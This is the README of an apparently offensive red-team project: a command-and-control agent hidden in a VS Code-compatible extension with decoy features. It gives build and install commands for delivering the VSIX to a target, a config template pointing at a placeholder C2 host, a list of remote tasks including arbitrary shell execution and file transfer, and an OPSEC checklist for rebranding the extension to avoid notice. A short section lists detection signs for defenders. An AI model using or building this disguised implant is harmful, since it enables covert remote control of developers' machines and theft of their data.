# vscode-websocket-c2

A pure-JavaScript C2 agent that runs entirely inside a VS Code-compatible IDE
extension host (VS Code, Cursor, Windsurf, and other Electron-based AI IDEs).
It speaks the **Mythic WebSocket C2 profile** protocol and can be adapted to
any WebSocket-capable C2 infrastructure, including Cobalt Strike via an
External C2 bridge.

**No binaries are dropped. No child implant processes. Nothing touches disk.**
All C2 traffic runs inside the IDE's own extension host process.

> **Authorized use only.** This tool is intended for red team operators and
> security researchers with explicit authorization to test target systems.
> See [SECURITY.md](SECURITY.md).

---

## How it works

```
IDE extension host (Node.js)
  └── extension.js  (this package, pure JS)
        └── WSS ──> redirector / team server (Mythic WebSocket profile)
```

- The extension ships with legitimate cover features (path autocomplete, word
  count status bar) so it behaves like a normal workspace utility.
- The C2 agent is **fully config-driven** — no hosts, keys, or UUIDs are
  embedded in the code. The agent stays dormant unless a runtime config file
  is present on the target.
- Reconnect logic uses exponential backoff and survives network changes
  (VPN flaps, interface swaps) because every poll cycle re-dials the socket.

## Repo layout

```
extension.js          Agent + cover features (single-file, no dependencies)
package.json          Extension manifest (generic identity — rebrand before ops)
config.example.json   Operator config template (never shipped in the VSIX)
build.js              Pre-package validation
build_extension.sh    One-shot build helper
docs/
  MYTHIC.md           Building a Mythic WebSocket payload + extracting config
  COBALT_STRIKE.md    External C2 bridge approach for Cobalt Strike
  CUSTOM_LISTENER.md  Wire protocol spec for custom C2 listeners
media/icon.png        Extension icon
```

## Quick start

### 1. Build the package

```bash
npm install -g @vscode/vsce   # once
./build_extension.sh          # or: npx vsce package --no-yarn --no-dependencies
```

Produces `workspace-dev-utils-<version>.vsix`.

### 2. Create the operator config

Copy the template and fill in values from your C2 profile:

```bash
cp config.example.json config.json
$EDITOR config.json
```

```json
{
  "wsUrl": "wss://YOUR_C2_HOST_OR_REDIRECTOR:443/",
  "payloadUUID": "REPLACE_WITH_PAYLOAD_UUID_FROM_MYTHIC_BUILD",
  "aesPSK": "REPLACE_WITH_BASE64_AES256_PSK_FROM_MYTHIC_BUILD",
  "encryptedExchangeCheck": false
}
```

### 3. Deliver

Install the VSIX into the target IDE:

```bash
# VS Code / Cursor / Devin-style Electron IDEs
<code-binary> --install-extension workspace-dev-utils-1.0.0.vsix
```

Then place `config.json` in one of the runtime search paths on the target:

| Priority | Location |
|---|---|
| 1 | Path in `$C2_CONFIG_PATH` env var |
| 2 | `~/.config/workspace-dev-utils/config.json` |
| 3 | `<extension install dir>/config.json` |

The agent activates a few seconds after the IDE loads the extension
(configurable delay + jitter) and checks in over the WebSocket.

## Configuration reference

| Key | Default | Description |
|---|---|---|
| `wsUrl` | — | WebSocket URL of the C2 / redirector (required) |
| `payloadUUID` | — | Mythic payload UUID (required) |
| `aesPSK` | — | Base64 AES-256 PSK for the envelope (required) |
| `encryptedExchangeCheck` | `false` | Set `true` if the profile requires EKE (RSA staging) |
| `intervalSec` | `10` | Base poll interval |
| `jitterPct` | `30` | Poll jitter percentage |
| `startDelayMs` | `6000` | Delay after activation before first connect |
| `startJitterMs` | `5000` | Randomized additional startup delay |
| `userAgent` | IE11 UA string | User-Agent used by cover HTTP features |

## Supported tasking

`shell`, `cd`, `pwd`, `ls`, `cat`, `download` (base64), `upload`,
`whoami`, `hostname`, `id`, `ps`, `ifconfig`, `getenv`, `sleep`, `exit`.

Unknown commands fall through to shell execution (`<command> <parameters>`).

## Detection surface (for defenders)

This project is also useful as a purple team reference. Observable behaviors:

- Extension host process holds a long-lived outbound WebSocket to an
  unusual destination.
- `child_process` spawns from an extension host when tasks execute.
- An extension directory whose `package.json` identity doesn't match the
  marketplace, or that was installed from a local VSIX.
- A `config.json` appearing in the extension directory or
  `~/.config/workspace-dev-utils/`.

No files are written by the agent itself, and no new executables are launched,
so pure file-scanning EDR rules will not fire on the payload.

## OPSEC checklist before an operation

- [ ] Rebrand `package.json` (`name`, `displayName`, `publisher`, repo URLs)
- [ ] Replace `media/icon.png`
- [ ] Generate a **fresh** Mythic payload (fresh UUID + PSK per target)
- [ ] Never commit `config.json` — it is gitignored, double-check anyway
- [ ] Point `wsUrl` at a redirector, never directly at the team server
- [ ] Verify `.vscodeignore` excludes docs, configs, and build scripts

## License

MIT — see [LICENSE](LICENSE).
